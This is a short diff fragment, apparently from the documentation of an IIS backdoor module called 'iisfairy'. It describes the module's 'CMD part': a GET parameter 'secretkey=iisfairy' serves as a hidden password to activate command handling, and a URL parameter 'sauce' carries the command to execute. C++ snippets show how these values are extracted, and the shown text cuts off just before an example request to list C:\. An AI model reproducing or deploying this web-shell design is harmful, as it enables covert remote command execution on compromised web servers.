@@ -18,9 +18,11 @@ std::wofstream outputFile("C:\\yourmomtheiisfairy.txt", std::ios::out | std::ios
 <b>CMD part :</b>
 
 --> Parameter in get url request to activate cmd detection, a.k.a. password :
+
 PCWSTR activateCMDtrigger = L"secretkey=iisfairy";
 
 --> Parameter in get url request to get cmd from :
+
 std::string paramValue = UrlDecode(ExtractQueryParamValue(urlBuffer, "sauce"));
 
 --> Url request example to display C:\ directory :
